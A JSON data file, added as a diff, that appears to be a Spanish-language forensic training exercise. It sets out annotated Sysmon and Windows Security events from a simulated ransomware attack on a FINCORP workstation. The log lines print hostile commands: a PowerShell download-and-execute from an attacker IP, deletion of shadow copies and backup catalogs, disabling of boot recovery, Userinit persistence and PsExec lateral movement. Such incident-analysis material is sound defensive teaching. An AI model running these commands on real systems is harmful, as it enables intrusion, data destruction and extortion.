@@ -1,0 +1,185 @@
+{
+  "descripcion": "Eventos de Sysmon (Canal Operational) y Windows Security Log de WKSTN-042. Windows 10 Pro · dominio FINCORP · usuario j.martinez. Los eventos abarcan desde el día previo al ataque (13 nov, infección inicial) hasta el cifrado masivo (14 nov 03:14). EventIDs Sysmon: 1=proceso, 3=red, 11=fichero, 13=registro. EventIDs Security: 4624=login, 4688=proceso, 4663=acceso objeto.",
+  "eventos": [
+    {
+      "timestamp": "13 nov · 18:02:14",
+      "event_id": "4688",
+      "host": "WKSTN-042",
+      "usuario": "j.martinez",
+      "descripcion": "Proceso creado — WINWORD.EXE abre 'Factura_pendiente_nov2025.docm' desde C:\\Users\\j.martinez\\Downloads\\",
+      "malicioso": false,
+      "nota": "Acceso inicial — el usuario abre el documento malicioso recibido por email"
+    },
+    {
+      "timestamp": "13 nov · 18:02:31",
+      "event_id": "1",
+      "host": "WKSTN-042",
+      "usuario": "j.martinez",
+      "descripcion": "Sysmon — Process Create — cmd.exe — ParentImage: WINWORD.EXE — CommandLine: cmd.exe /c powershell -w hidden -enc JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
+      "malicioso": true,
+      "nota": "Macro AutoOpen ejecuta PowerShell ofuscado con Base64 — patrón clásico de descarga de payload"
+    },
+    {
+      "timestamp": "13 nov · 18:02:44",
+      "event_id": "1",
+      "host": "WKSTN-042",
+      "usuario": "j.martinez",
+      "descripcion": "Sysmon — Process Create — powershell.exe — CommandLine: IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.47/s/stage1.ps1')",
+      "malicioso": true,
+      "nota": "PowerShell descarga y ejecuta el stager desde el C2 — técnica Living off the Land"
+    },
+    {
+      "timestamp": "13 nov · 18:03:01",
+      "event_id": "11",
+      "host": "WKSTN-042",
+      "usuario": "j.martinez",
+      "descripcion": "Sysmon — File Create — C:\\Users\\Public\\svchost.exe — creado por powershell.exe (tamaño: 892 KB)",
+      "malicioso": true,
+      "nota": "Payload dropeado en C:\\Users\\Public\\ — directorio sin restricciones de escritura, nombre engañoso"
+    },
+    {
+      "timestamp": "13 nov · 18:03:04",
+      "event_id": "1",
+      "host": "WKSTN-042",
+      "usuario": "j.martinez",
+      "descripcion": "Sysmon — Process Create — C:\\Users\\Public\\svchost.exe — SHA256: 8F3A2C1D9E7B4F6A2C8D5E3F7A1B9C4D — PID: 3872",
+      "malicioso": true,
+      "nota": "El payload renombrado como svchost.exe se ejecuta — distinto SHA256 al svchost legítimo de System32"
+    },
+    {
+      "timestamp": "13 nov · 18:03:09",
+      "event_id": "13",
+      "host": "WKSTN-042",
+      "usuario": "j.martinez",
+      "descripcion": "Sysmon — Registry Value Set — TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit — Details: C:\\Windows\\system32\\userinit.exe, C:\\Users\\Public\\svchost.exe",
+      "malicioso": true,
+      "nota": "Persistencia vía Winlogon Userinit — se ejecuta en CADA inicio de sesión, incluido el de SYSTEM"
+    },
+    {
+      "timestamp": "13 nov · 18:03:12",
+      "event_id": "3",
+      "host": "WKSTN-042",
+      "usuario": "j.martinez",
+      "descripcion": "Sysmon — Network Connect — svchost.exe (PID 3872) — dst: 185.220.101.47:443 — protocolo HTTPS",
+      "malicioso": true,
+      "nota": "Primera conexión C2 — el malware registra el host comprometido en el servidor del atacante"
+    },
+    {
+      "timestamp": "13 nov · 22:14:00",
+      "event_id": "3",
+      "host": "WKSTN-042",
+      "usuario": "SYSTEM",
+      "descripcion": "Sysmon — Network Connect — svchost.exe (PID 3872) — dst: 185.220.101.47:443 — beacon periódico (cada 4h)",
+      "malicioso": true,
+      "nota": "Beacon nocturno — el malware sigue activo mientras el usuario duerme"
+    },
+    {
+      "timestamp": "14 nov · 02:14:00",
+      "event_id": "3",
+      "host": "WKSTN-042",
+      "usuario": "SYSTEM",
+      "descripcion": "Sysmon — Network Connect — svchost.exe (PID 3872) — dst: 185.220.101.47:443 — beacon + respuesta 47 KB",
+      "malicioso": true,
+      "nota": "C2 envía instrucciones — el paquete de respuesta es 47 KB mayor de lo habitual — activación del módulo ransomware"
+    },
+    {
+      "timestamp": "14 nov · 03:08:22",
+      "event_id": "1",
+      "host": "WKSTN-042",
+      "usuario": "SYSTEM",
+      "descripcion": "Sysmon — Process Create — vssadmin.exe — CommandLine: vssadmin delete shadows /all /quiet — Parent: svchost.exe (PID 3872)",
+      "malicioso": true,
+      "nota": "ELIMINACIÓN DE SHADOW COPIES — impide la recuperación de ficheros sin backup externo — técnica estándar pre-cifrado"
+    },
+    {
+      "timestamp": "14 nov · 03:08:24",
+      "event_id": "1",
+      "host": "WKSTN-042",
+      "usuario": "SYSTEM",
+      "descripcion": "Sysmon — Process Create — wbadmin.exe — CommandLine: wbadmin delete catalog -quiet — Parent: svchost.exe (PID 3872)",
+      "malicioso": true,
+      "nota": "Elimina el catálogo de Windows Backup — segunda línea de destrucción de recuperación"
+    },
+    {
+      "timestamp": "14 nov · 03:08:31",
+      "event_id": "1",
+      "host": "WKSTN-042",
+      "usuario": "SYSTEM",
+      "descripcion": "Sysmon — Process Create — bcdedit.exe — CommandLine: bcdedit /set {default} recoveryenabled No — Parent: svchost.exe (PID 3872)",
+      "malicioso": true,
+      "nota": "Deshabilita la recuperación automática de Windows — el sistema no podrá arrancar en modo de recuperación"
+    },
+    {
+      "timestamp": "14 nov · 03:09:17",
+      "event_id": "1",
+      "host": "WKSTN-042",
+      "usuario": "SYSTEM",
+      "descripcion": "Sysmon — Process Create — PsExec.exe — CommandLine: PsExec.exe \\\\SRV-FILES-01 -s -d cmd /c C:\\Windows\\Temp\\nc.exe — Parent: svchost.exe",
+      "malicioso": true,
+      "nota": "MOVIMIENTO LATERAL — PsExec hacia SRV-FILES-01 usando credenciales de SYSTEM del dominio — propaga el ransomware"
+    },
+    {
+      "timestamp": "14 nov · 03:10:44",
+      "event_id": "4624",
+      "host": "SRV-FILES-01",
+      "usuario": "FINCORP\\WKSTN-042$",
+      "descripcion": "Logon exitoso — Tipo 3 (red) — cuenta de máquina WKSTN-042$ en SRV-FILES-01 — LogonID: 0x9FA341",
+      "malicioso": true,
+      "nota": "La cuenta de máquina de WKSTN-042 se autentica en el servidor de ficheros — acceso lateral conseguido"
+    },
+    {
+      "timestamp": "14 nov · 03:14:07",
+      "event_id": "4663",
+      "host": "WKSTN-042",
+      "usuario": "SYSTEM",
+      "descripcion": "Acceso a objeto — WriteData en C:\\Users\\j.martinez\\Documents\\Presupuesto_2026.xlsx → renombrado a Presupuesto_2026.xlsx.ncrypt",
+      "malicioso": true,
+      "nota": "INICIO DEL CIFRADO — primer fichero cifrado registrado — extensión .ncrypt — 03:14:07"
+    },
+    {
+      "timestamp": "14 nov · 03:14:09",
+      "event_id": "4663",
+      "host": "WKSTN-042",
+      "usuario": "SYSTEM",
+      "descripcion": "Acceso a objeto — WriteData en C:\\Users\\j.martinez\\Documents\\Contratos_clientes.docx → .ncrypt",
+      "malicioso": true,
+      "nota": ""
+    },
+    {
+      "timestamp": "14 nov · 03:14:11",
+      "event_id": "11",
+      "host": "WKSTN-042",
+      "usuario": "SYSTEM",
+      "descripcion": "Sysmon — File Create — C:\\Users\\j.martinez\\Desktop\\README_DECRYPT.txt — creado por svchost.exe (PID 3872)",
+      "malicioso": true,
+      "nota": "Nota de rescate depositada — solicita 4 BTC a la dirección bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+    },
+    {
+      "timestamp": "14 nov · 03:14:30",
+      "event_id": "4663",
+      "host": "WKSTN-042",
+      "usuario": "SYSTEM",
+      "descripcion": "RÁFAGA MASIVA — 8.421 eventos WriteData en C:\\, D:\\ y \\\\SRV-FILES-01\\shares\\ — todos los ficheros renombrados a .ncrypt en 20 minutos",
+      "malicioso": true,
+      "nota": "El 80% del almacenamiento corporativo cifrado — alerta crítica del EDR a las 03:34"
+    },
+    {
+      "timestamp": "14 nov · 02:45:00",
+      "event_id": "4624",
+      "host": "WKSTN-042",
+      "usuario": "FINCORP\\backup_svc",
+      "descripcion": "Logon exitoso — Tipo 5 (servicio) — cuenta de backup programado — horario habitual",
+      "malicioso": false,
+      "nota": "Tráfico legítimo — job de backup nocturno programado"
+    },
+    {
+      "timestamp": "14 nov · 02:00:00",
+      "event_id": "1",
+      "host": "WKSTN-042",
+      "usuario": "SYSTEM",
+      "descripcion": "Proceso creado — MsMpEng.exe (Windows Defender) — análisis programado — normal",
+      "malicioso": false,
+      "nota": ""
+    }
+  ]
+}
